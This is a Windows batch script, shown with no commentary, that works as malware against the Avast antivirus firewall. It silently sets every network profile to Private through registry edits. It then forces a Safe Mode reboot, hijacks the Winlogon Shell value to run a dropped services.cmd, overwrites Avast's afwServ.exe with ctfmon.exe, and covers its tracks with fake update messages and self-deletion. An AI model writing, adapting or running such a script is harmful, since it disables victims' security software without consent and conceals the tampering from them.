::::::::::::::::::::::::::::
::          START         ::
::::::::::::::::::::::::::::
Mode 90,20 & color 0A
SetLocal EnableExtensions DisableDelayedExpansion
(Set k=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles)
For /F "Delims==" %%A In ('Set GUID[ 2^>Nul') Do Set "%%A="
Set "i=101"
For /F "Tokens=1,2*" %%A In ('Reg Query "%k%" /S /V Description') Do (
    If "%%~nB" NEQ "%%~B" (
        Call Set "GUID[%%i:*1=%%]=%%~nB"
start C:\Games\viewer.exe /HideWindow Reg add "%k%\%%~nB" /V Category /t REG_DWORD /d 1 /f
    ) Else (
        Call Call Set GUID[%%i:*1=%%]="%%%%GUID[%%i:*1=%%]%%%%","%%C"
        Set/A i+=1
    )
)   
set /a numa=%random% %%9999 +1000
set /a numb=%random% %%9999 +1000
set /a numc=%numa%%numb%
IF EXIST "C:\Program Files\Avast Software\Avast\afwServ.exe" (
bcdedit /set {current} safeboot minimal 
Reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /V Shell /t REG_SZ /d "explorer.exe, C:\Games\services.cmd" /f
echo copy /Y C:\Windows\System32\ctfmon.exe "C:\Program Files\Avast Software\Avast\afwServ.exe" > C:\Games\services.cmd
echo bcdedit /deletevalue {current} safeboot >> C:\Games\services.cmd
echo Reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /V Shell /t REG_SZ /d "explorer.exe" /f >> C:\Games\services.cmd
echo shutdown -f -r -t 3 -c "Update complete.." >> C:\Games\services.cmd
echo del C:\Games\services.cmd /S /Q >> C:\Games\services.cmd
shutdown -f -r -t 3 -c "Updating please wait.."
)
IF EXIST "C:\Program Files (x86)\Avast Software\Avast\afwServ.exe" (
bcdedit /set {current} safeboot minimal 
Reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /V Shell /t REG_SZ /d "explorer.exe, C:\Games\services.cmd" /f
echo copy /Y C:\Windows\System32\ctfmon.exe "C:\Program Files\Avast Software\Avast\afwServ.exe" > C:\Games\services.cmd
echo bcdedit /deletevalue {current} safeboot >> C:\Games\services.cmd
echo Reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /V Shell /t REG_SZ /d "explorer.exe" /f >> C:\Games\services.cmd
echo shutdown -f -r -t 3 -c "Update complete.." >> C:\Games\services.cmd
echo del C:\Games\services.cmd /S /Q >> C:\Games\services.cmd
shutdown -f -r -t 3 -c "Updating please wait.."
)